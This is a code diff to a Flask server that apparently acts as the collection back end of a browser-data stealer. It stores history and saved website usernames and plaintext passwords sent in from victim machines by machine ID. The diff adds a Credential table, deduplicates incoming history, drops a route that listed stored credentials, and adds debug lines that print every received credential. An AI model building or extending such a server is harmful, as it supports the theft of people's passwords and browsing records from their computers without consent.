@@ -31,8 +31,20 @@ class History(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
     url = db.Column(db.Text)
-    title = db.Column(db.Text)
+    title = db.Column(db.Text, nullable=True)
     visit_time = db.Column(db.String(128))
+    browser_type = db.Column(db.String(16))
+
+    __table_args__ = (
+        db.UniqueConstraint('machine_id', 'url', 'visit_time', 'browser_type', name='uix_history_unique'),
+    )
+
+class Credential(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
+    website = db.Column(db.String(256))
+    username = db.Column(db.String(128))
+    password = db.Column(db.Text)
     browser_type = db.Column(db.String(16))
 
 # ========== ROUTES ==========
@@ -121,19 +133,6 @@ def api_history(machine_id):
         } for r in rows
     ])
 
-@app.route("/api/credentials/<machine_id>")
-def api_credentials(machine_id):
-    rows = Credential.query.filter_by(machine_id=machine_id).all()
-    return jsonify([
-        {
-            "website": r.website,
-            "username": r.username,
-            "password": r.password,
-            "browser_type": r.browser_type
-        } for r in rows
-    ])
-
-
 @app.route("/submit/history", methods=["POST"])
 def receive_history():
     data = request.get_json()
@@ -143,8 +142,14 @@ def receive_history():
     print(f"[DEBUG] Received {len(entries)} history items from {machine_id}")
 
     for item in entries:
-        print(f"[DEBUG] Saving: {item}")
-        db.session.add(History(machine_id=machine_id, **item))
+        exists = History.query.filter_by(
+            machine_id=machine_id,
+            url=item['url'],
+            visit_time=item['visit_time'],
+            browser_type=item['browser_type']
+        ).first()
+        if not exists:
+            db.session.add(History(machine_id=machine_id, **item))
 
     db.session.commit()
     return jsonify({"status": "ok", "count": len(entries)})
@@ -154,8 +159,13 @@ def receive_credentials():
     data = request.get_json()
     machine_id = data.get("machine_id")
     entries = data.get("credentials", [])
+
+    print(f"[DEBUG] Received {len(entries)} credentials from {machine_id}")
+
     for item in entries:
+        print(f"[DEBUG] Saving: {item}")
         db.session.add(Credential(machine_id=machine_id, **item))
+
     db.session.commit()
     return jsonify({"status": "ok", "count": len(entries)})
 
